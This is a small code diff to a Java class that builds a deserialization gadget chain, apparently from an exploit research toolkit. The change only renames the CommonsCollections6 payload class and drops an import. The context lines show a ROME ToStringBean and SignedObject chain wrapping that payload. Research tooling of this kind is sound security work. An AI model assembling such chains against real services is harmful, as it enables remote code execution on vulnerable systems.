@@ -4,7 +4,6 @@ import com.sun.org.apache.xpath.internal.objects.XString;
 import com.sun.syndication.feed.impl.ToStringBean;
 import org.springframework.aop.target.HotSwappableTargetSource;
 
-import javax.xml.transform.Templates;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.security.KeyPair;
@@ -18,7 +17,7 @@ public class RomeXStringChain {
         KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
         kpg.initialize(1024);
         KeyPair kp = kpg.generateKeyPair();
-        SignedObject signedObject=new SignedObject(CC6EXP.getPayload(), kp.getPrivate(), Signature.getInstance("DSA"));
+        SignedObject signedObject=new SignedObject(Gadget_CC6.getPayload(), kp.getPrivate(), Signature.getInstance("DSA"));
 
         ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);
 
